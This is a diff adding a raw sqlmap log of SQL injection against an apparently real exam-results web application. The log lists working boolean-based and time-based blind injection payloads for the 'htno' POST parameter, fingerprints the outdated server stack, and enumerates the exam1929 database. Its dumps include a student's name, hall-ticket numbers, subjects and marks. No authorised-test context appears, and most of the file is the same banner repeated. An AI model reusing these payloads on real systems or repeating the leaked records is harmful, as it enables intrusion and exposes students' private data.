@@ -1,0 +1,1256 @@
+sqlmap identified the following injection point(s) with a total of 321 HTTP(s) requests:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+current database: 'exam1929'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+    Vector: AND [INFERENCE]
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+current database: 'exam1929'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: buffer_aug_2025
+[3 entries]
++-------------------------+--------+--------------+----------------------------------+-------+
+| name                    | qpcode | htno         | sname                            | marks |
++-------------------------+--------+--------------+----------------------------------+-------+
+| NULL                    | 8504S  | 100520733054 | AUTOMATA LANGUAGES & COMPUTATION | 13    |
+| NULL                    | 3104S  | 100520733054 | Logic & Switching theory         | 37    |
+| AVALA JAYENDRA MAHARSHI | 7303S  | 100521730004 | MINE ENVIRONMENTAL ENGINEERING-I | 26    |
++-------------------------+--------+--------------+----------------------------------+-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_11_main_2025
+[27 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| name           | varchar(255) |
+| result         | varchar(255) |
+| status         | varchar(255) |
+| branch         | varchar(255) |
+| credit         | varchar(255) |
+| etype          | varchar(255) |
+| ExamDate       | varchar(255) |
+| eyear          | varchar(255) |
+| grade_point    | varchar(255) |
+| htno           | varchar(255) |
+| letter_grade   | varchar(255) |
+| marks          | varchar(255) |
+| maxmark_see    | varchar(255) |
+| maxmarks       | varchar(255) |
+| mod_num        | varchar(255) |
+| orderby        | varchar(255) |
+| percentage     | varchar(255) |
+| percentage_see | varchar(255) |
+| qpcode         | varchar(255) |
+| remarks        | varchar(25)  |
+| result_see     | varchar(255) |
+| scd            | varchar(255) |
+| sem            | varchar(255) |
+| sessmrks       | varchar(255) |
+| sname          | varchar(255) |
+| total          | varchar(255) |
+| total_see      | varchar(255) |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+Database: exam1929
+Table: marks_be_11_main_2025
+[27 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| name           | varchar(255) |
+| result         | varchar(255) |
+| status         | varchar(255) |
+| branch         | varchar(255) |
+| credit         | varchar(255) |
+| etype          | varchar(255) |
+| ExamDate       | varchar(255) |
+| eyear          | varchar(255) |
+| grade_point    | varchar(255) |
+| htno           | varchar(255) |
+| letter_grade   | varchar(255) |
+| marks          | varchar(255) |
+| maxmark_see    | varchar(255) |
+| maxmarks       | varchar(255) |
+| mod_num        | varchar(255) |
+| orderby        | varchar(255) |
+| percentage     | varchar(255) |
+| percentage_see | varchar(255) |
+| qpcode         | varchar(255) |
+| remarks        | varchar(25)  |
+| result_see     | varchar(255) |
+| scd            | varchar(255) |
+| sem            | varchar(255) |
+| sessmrks       | varchar(255) |
+| sname          | varchar(255) |
+| total          | varchar(255) |
+| total_see      | varchar(255) |
++----------------+--------------+
+
+Database: exam1929
+Table: marks_be_11_main_2025
+[0 entries]
++-----+-----+------+-------+-------+-------+-------+-------+--------+--------+--------+--------+---------+---------+---------+----------+----------+----------+----------+----------+-----------+------------+------------+-------------+-------------+--------------+----------------+
+| scd | sem | htno | etype | eyear | marks | sname | total | name   | branch | credit | qpcode | mod_num | orderby | remarks | ExamDate | result   | status   | maxmarks | sessmrks | total_see | percentage | result_see | grade_point | maxmark_see | letter_grade | percentage_see |
++-----+-----+------+-------+-------+-------+-------+-------+--------+--------+--------+--------+---------+---------+---------+----------+----------+----------+----------+----------+-----------+------------+------------+-------------+-------------+--------------+----------------+
++-----+-----+------+-------+-------+-------+-------+-------+--------+--------+--------+--------+---------+---------+---------+----------+----------+----------+----------+----------+-----------+------------+------------+-------------+-------------+--------------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: Apache 2.2.3, PHP 5.1.6
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
+web server operating system: Linux Red Hat Enterprise 5 (Tikanga)
+web application technology: PHP 5.1.6, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: htno (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: htno=100523733049' AND 7466=7466 AND 'oWKf'='oWKf&submit=SUBMIT
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: htno=100523733049' AND SLEEP(5) AND 'axWG'='axWG&submit=SUBMIT
+---
